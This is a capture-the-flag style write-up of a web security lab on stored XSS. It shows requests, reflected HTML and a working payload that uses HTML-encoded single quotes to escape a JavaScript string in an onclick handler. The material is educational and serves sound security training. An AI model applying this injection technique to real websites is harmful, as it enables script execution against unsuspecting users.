## 20 - Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped

This lab contains a stored cross-site scripting vulnerability in the comment functionality.

To solve this lab, submit a comment that calls the alert function when the comment author name is clicked.

## Notes

- Possibility to leave a comment on a post

## Resume

1. Post a comment on a blog post
2. Inject payload inside the `Website` field
3. Click on the author name to trigger the XSS

## Solve

First, post a comment with a random value inside the `Website` field.

Example:

```http
POST /post/comment HTTP/2
Host: 0ab300bb0366d0da8055356200dc0043.web-security-academy.net
Cookie: session=qTjCUaWwgz4mwVaIUP0gyVv93tmNU466
```

Then open the blog post again and intercept the request:

```http
GET /post?postId=6 HTTP/2
Host: 0ab300bb0366d0da8055356200dc0043.web-security-academy.net
Cookie: session=qTjCUaWwgz4mwVaIUP0gyVv93tmNU466
```

The value from the `Website` field is reflected inside an `onclick` event handler:

```html
<p>
    <img src="/resources/images/avatarDefault.svg" class="avatar">
    <a id="author" href="http://toto.com"
       onclick="var tracker={track(){}};tracker.track('http://toto.com');">
       pouet
    </a>
</p>
```

The application injects our input inside:

```javascript
tracker.track('USER_INPUT');
```

To exploit this, use the following payload inside the `Website` field:

```text
http://toto?&apos;-alert(1)-&apos;
```

Once rendered, the HTML becomes:

```html
<a id="author"
href="http://toto?'-alert(1)-'"
onclick="var tracker={track(){}};tracker.track('http://toto?'-alert(1)-'');">
pouet
</a>
```

The injected single quotes break out of the JavaScript string inside the `onclick` handler and execute:

```javascript
alert(1)
```

Click on the author name above the comment to trigger the XSS and solve the lab.